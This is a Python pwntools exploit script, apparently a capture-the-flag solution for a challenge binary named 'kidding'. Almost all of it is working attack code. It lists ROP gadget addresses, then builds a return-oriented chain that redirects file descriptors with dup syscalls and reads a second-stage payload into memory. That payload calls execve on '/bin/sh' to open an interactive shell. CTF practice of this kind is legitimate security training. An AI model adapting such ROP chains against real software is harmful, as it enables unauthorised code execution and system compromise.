#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

# 0x0806F290 : int 80  ; ret
# 0x080b8536 : pop eax ; ret
# 0x080481c9 : pop ebx ; ret
# 0x080583c9 : pop ecx ; ret
# 0x0806ec8b : pop edx ; ret
# 0x080b84d6 : push eax ; ret
# 0x08089dba : push ebx ; ret
# 0x080dbf05 : push ecx ; ret
# 0x08063a28 : push edx ; ret
# 0x080b8546 : push esp ; ret
# 0x080d06ee : push esi ; ret
# 0x080616c8 : sub eax, ecx ; ret
# 0x0805465c : sub eax, edx ; ret
# 0x080884b9 : sub ebp, ebx ; ret
# 0x0806ec8a : pop ebx ; pop edx ; ret
# 0x0806ecb1 : pop ecx ; pop ebx ; ret
# 0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret

from pwn import *
context.log_level="debug"
pwn_file="./kidding"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    #conn=remote("chall.pwnable.tw",10303)
    conn=remote("work",4444)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

# dup(5,0)
# dup(8,1)
p="a"*8
p += p32(0x080eb000)
p += p32(0x0806ecb1)# pop ecx,ebx
p += p32(1)
p += p32(8)
p += p32(0x080b8536)# pop eax
p += p32(0x3f)
p += p32(0x0806F290)# int 0x80
p += p32(0x0806ecb1)# pop ecx,ebx
p += p32(0)
p += p32(5)
p += p32(0x080b8536)# pop eax
p += p32(0x3f)
p += p32(0x0806F290)# int 0x80
# read
p += p32(0x080b8536)# pop eax
p += p32(0x3)
p += p32(0x0806ecb0)# pop edx ecx ebx 
p += p32(0x100)
p += p32(0x80eb000)
p += p32(0)
p += p32(0x0806F290)# int 0x80
# leave ret
p += p32(0x080488B5)
conn.send(p)
sleep(1)
# write in 0x80eb000
p = ""
p += p32(0x80eb000)
# execve 
p += p32(0x080b8536)# pop eax
p += p32(0xb)
p += p32(0x0806ecb0)# pop edx ecx ebx
p += p32(0)
p += p32(0)
p += p32(0x080eb020)
p += p32(0x0806F290)# int 0x80
p += "/bin/sh\x00"

conn.send(p)
conn.interactive()
